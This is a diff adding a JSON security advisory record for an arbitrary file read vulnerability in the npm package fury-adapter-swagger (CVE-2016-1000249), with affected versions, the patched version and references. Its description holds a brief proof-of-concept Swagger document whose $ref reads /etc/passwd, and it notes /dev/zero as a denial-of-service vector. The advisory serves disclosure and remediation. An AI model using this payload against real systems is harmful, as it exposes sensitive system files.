@@ -1,0 +1,49 @@
+{
+  "Severity": "CRITICAL",
+  "UpdatedAt": "2020-08-31T18:18:38Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "fury-adapter-swagger"
+  },
+  "Advisory": {
+    "DatabaseId": 2381,
+    "Id": "MDE2OlNlY3VyaXR5QWR2aXNvcnlHSFNBLTJyN2YtNGgyYy01eDcz",
+    "GhsaId": "GHSA-2r7f-4h2c-5x73",
+    "References": [
+      {
+        "Url": "https://www.npmjs.com/advisories/305"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2016-1000249"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-2r7f-4h2c-5x73"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-2r7f-4h2c-5x73"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2016-1000249"
+      }
+    ],
+    "Description": "Affected versions of `fury-adapter-swagger` have a weakness that allows an attacker to read arbitrary files off of the system. This can be used to read sensitive data, or to cause a denial of service condition by attempting to read something like `/dev/zero`.\n\n## Proof of Concept:\n\n```\n---\nswagger: '2.0'\ninfo:\n  title: Read local files\n  version: '1.0'\n\npaths:\n  /foo:\n    get:\n      responses:\n        200:\n          description: Some description\n          examples:\n            text/html:\n              example:\n                $ref: '/etc/passwd'\n```\n\n\n## Recommendation\n\nUpgrade to version 0.9.7 or later",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2020-09-01T16:38:33Z",
+    "Severity": "CRITICAL",
+    "Summary": "Arbitrary File Read in fury-adapter-swagger",
+    "UpdatedAt": "2020-09-01T16:38:33Z",
+    "WithdrawnAt": ""
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "0.9.7"
+      },
+      "VulnerableVersionRange": "\u003e= 0.2.0, \u003c 0.9.7"
+    }
+  ]
+}
